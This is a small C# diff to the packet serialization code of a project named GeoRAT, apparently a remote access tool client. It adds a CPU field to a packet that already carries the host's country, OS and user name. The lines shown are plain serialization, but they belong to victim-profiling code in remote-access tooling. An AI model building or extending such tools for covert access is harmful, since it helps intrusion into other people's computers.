@@ -1,5 +1,6 @@
 ﻿
 using System.IO;
+using GeoRAT.Client.PacketStruct.PacketStruct;
 
 namespace GeoRAT.Client.PacketStruct
 {
@@ -15,6 +16,7 @@ namespace GeoRAT.Client.PacketStruct
             writer.Write(i.Country);
             writer.Write(i.OS);
             writer.Write(i.UserName);
+            writer.Write(i.CPU);
             return stream.ToArray();
         }
 
@@ -26,6 +28,7 @@ namespace GeoRAT.Client.PacketStruct
             i.Country = read.ReadString();
             i.OS = read.ReadString();
             i.UserName = read.ReadString();
+            i.CPU = read.ReadString();
             return i;
         }
     }
